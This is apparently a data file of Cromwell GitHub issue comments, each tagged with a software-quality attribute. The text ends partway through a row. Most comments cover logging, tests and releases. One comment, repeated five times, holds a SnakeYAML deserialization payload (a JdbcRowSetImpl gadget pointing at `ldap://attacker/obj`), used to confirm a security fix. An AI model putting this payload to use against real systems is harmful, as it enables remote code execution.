https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:696,Security,access,access,696,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:983,Security,access,access,983,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:1044,Security,access,access,1044,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:1084,Security,access,access,1084,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:586,Testability,log,log,586,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6532#issuecomment-976113622:30,Availability,failure,failure,30,Will need to investigate this failure-- java.lang.NoClassDefFoundError: com/vladsch/flexmark/util/ast/Node,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6532#issuecomment-976113622
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150:206,Integrability,message,message,206,"@salonishah11 we do [already](https://github.com/broadinstitute/cromwell/blob/a70b4fd071ac05f515bf1a9a96155a19acc145b3/engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala#L448) have a logged message ""Successfully deleted intermediate output file(s) for root workflow $rootWorkflowIdForLogging."" So unless we want to log a message for each individual file (which seems like it could be a lot… but maybe useful information?), I think we are already set with that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150:337,Integrability,message,message,337,"@salonishah11 we do [already](https://github.com/broadinstitute/cromwell/blob/a70b4fd071ac05f515bf1a9a96155a19acc145b3/engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala#L448) have a logged message ""Successfully deleted intermediate output file(s) for root workflow $rootWorkflowIdForLogging."" So unless we want to log a message for each individual file (which seems like it could be a lot… but maybe useful information?), I think we are already set with that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150:199,Testability,log,logged,199,"@salonishah11 we do [already](https://github.com/broadinstitute/cromwell/blob/a70b4fd071ac05f515bf1a9a96155a19acc145b3/engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala#L448) have a logged message ""Successfully deleted intermediate output file(s) for root workflow $rootWorkflowIdForLogging."" So unless we want to log a message for each individual file (which seems like it could be a lot… but maybe useful information?), I think we are already set with that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150:331,Testability,log,log,331,"@salonishah11 we do [already](https://github.com/broadinstitute/cromwell/blob/a70b4fd071ac05f515bf1a9a96155a19acc145b3/engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala#L448) have a logged message ""Successfully deleted intermediate output file(s) for root workflow $rootWorkflowIdForLogging."" So unless we want to log a message for each individual file (which seems like it could be a lot… but maybe useful information?), I think we are already set with that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934750150
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674:96,Integrability,message,message,96,"@cahrens Yes you are right. If we could somehow add the list of files that were deleted in that message or some other log message, in my opinion, it would be useful for debugging to figure out which files being deleted were associated with which workflow. But if you think it could be a lot of messages to add then I am fine with not adding it 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674:122,Integrability,message,message,122,"@cahrens Yes you are right. If we could somehow add the list of files that were deleted in that message or some other log message, in my opinion, it would be useful for debugging to figure out which files being deleted were associated with which workflow. But if you think it could be a lot of messages to add then I am fine with not adding it 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674:294,Integrability,message,messages,294,"@cahrens Yes you are right. If we could somehow add the list of files that were deleted in that message or some other log message, in my opinion, it would be useful for debugging to figure out which files being deleted were associated with which workflow. But if you think it could be a lot of messages to add then I am fine with not adding it 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674
https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674:118,Testability,log,log,118,"@cahrens Yes you are right. If we could somehow add the list of files that were deleted in that message or some other log message, in my opinion, it would be useful for debugging to figure out which files being deleted were associated with which workflow. But if you think it could be a lot of messages to add then I am fine with not adding it 👍",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6538#issuecomment-934765674
https://github.com/broadinstitute/cromwell/pull/6542#issuecomment-947647448:318,Deployability,update,updated,318,"> > Should this be documented in the Cromwell docs?; > ; > That's a good question, I'm not sure. It feels a little provisional right now - would we be free to change or remove it later once it was out there?. I'd suggest you discuss the Cromwell documentation strategy with the folks who have been here longer. I have updated it for bug fixes/changes, but those were more straightforward (with no future work planned).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6542#issuecomment-947647448
https://github.com/broadinstitute/cromwell/pull/6546#issuecomment-947148974:42,Availability,failure,failure,42,"Not expecting the AWS build to pass, that failure is addressed in #6547.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6546#issuecomment-947148974
https://github.com/broadinstitute/cromwell/pull/6547#issuecomment-947148731:45,Availability,failure,failures,45,"Not expecting the PAPI builds to pass, those failures are addressed in #6546.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6547#issuecomment-947148731
https://github.com/broadinstitute/cromwell/issues/6548#issuecomment-1102920561:0,Testability,Test,Testing,0,Testing GenericS3 support in #6737,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6548#issuecomment-1102920561
https://github.com/broadinstitute/cromwell/pull/6549#issuecomment-954121567:52,Testability,test,test,52,"I have CromwellOnAzure working now, so I'm going to test the UAMI functionality there before merging this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6549#issuecomment-954121567
https://github.com/broadinstitute/cromwell/pull/6549#issuecomment-959131111:24,Testability,test,testing,24,See BT-437 for in-Azure testing notes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6549#issuecomment-959131111
https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026:39,Testability,test,test,39,@kpierre13 It looks like framework for test for this file already exists. You should be able to add new test here - [SwaggerUiHttpServiceSpec](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/test/scala/cromwell/webservice/SwaggerUiHttpServiceSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026
https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026:104,Testability,test,test,104,@kpierre13 It looks like framework for test for this file already exists. You should be able to add new test here - [SwaggerUiHttpServiceSpec](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/test/scala/cromwell/webservice/SwaggerUiHttpServiceSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026
https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026:210,Testability,test,test,210,@kpierre13 It looks like framework for test for this file already exists. You should be able to add new test here - [SwaggerUiHttpServiceSpec](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/test/scala/cromwell/webservice/SwaggerUiHttpServiceSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026
https://github.com/broadinstitute/cromwell/pull/6555#issuecomment-1024498874:103,Deployability,release,releases,103,@leipzig can you please target the `develop` branch rather than `master`? We only merge to `master` on releases. 🙏,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6555#issuecomment-1024498874
https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067:132,Availability,error,error,132,"So this is not actually a flaky test, but an indication that our code is also failing about half the time in production because the error message is not what we expected?. If that is true, I think the release notes need to be filled out in the ticket so that this makes it into the Terra release notes as a fixed bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067
https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067:201,Deployability,release,release,201,"So this is not actually a flaky test, but an indication that our code is also failing about half the time in production because the error message is not what we expected?. If that is true, I think the release notes need to be filled out in the ticket so that this makes it into the Terra release notes as a fixed bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067
https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067:288,Deployability,release,release,288,"So this is not actually a flaky test, but an indication that our code is also failing about half the time in production because the error message is not what we expected?. If that is true, I think the release notes need to be filled out in the ticket so that this makes it into the Terra release notes as a fixed bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067
https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067:138,Integrability,message,message,138,"So this is not actually a flaky test, but an indication that our code is also failing about half the time in production because the error message is not what we expected?. If that is true, I think the release notes need to be filled out in the ticket so that this makes it into the Terra release notes as a fixed bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067
https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067:32,Testability,test,test,32,"So this is not actually a flaky test, but an indication that our code is also failing about half the time in production because the error message is not what we expected?. If that is true, I think the release notes need to be filled out in the ticket so that this makes it into the Terra release notes as a fixed bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556#issuecomment-960861067
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:13,Availability,failure,failure,13,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:525,Availability,ERROR,ERROR,525,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:1069,Energy Efficiency,adapt,adapted,1069,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:1069,Modifiability,adapt,adapted,1069,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:8,Testability,test,test,8,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:41,Testability,test,test,41,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at centaur.test.Operations$$anon$15.$anonfun$status$2$adapted(Test.scala:292)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499
https://github.com/broadinstitute/cromwell/pull/6557#issuecomment-961386499:118,Testability,test,tests,118,"Centaur test failure was in an unrelated test (see below, https://broadworkbench.atlassian.net/browse/CROM-6744). The tests that I modified passed, and I am rerunning the failed stage. Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: a4d90928-3f33-4be6-87d7-a3d01a0b73[...]); 19:12:57.605 [daemonpool-thread-43] INFO centaur.api.CentaurCromwellClient$ - Submitting cwl_relative_imports_url returned workflow id 39a765a7-4294-4da4-a059-5204d29a5abf; 19:13:02.771 [pool-3-thread-1] ERROR centaur.reporting.Slf4jReporter - Test 'successfully run cwl_relative_imports_url' failed on attempt 3 of 3 with workflow id '39a765a7-4294-4da4-a059-5204d29a5abf' ; centaur.test.CentaurTestException: Unexpected terminal status Failed while waiting for one of [Running, Succeeded] (workflow ID: 39a765a7-4294-4da4-a059-5204d29a5abf); 	at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); 	at centaur.test.Operations$$anon$15.$anonfun$status$2(Test.scala:294); 	at 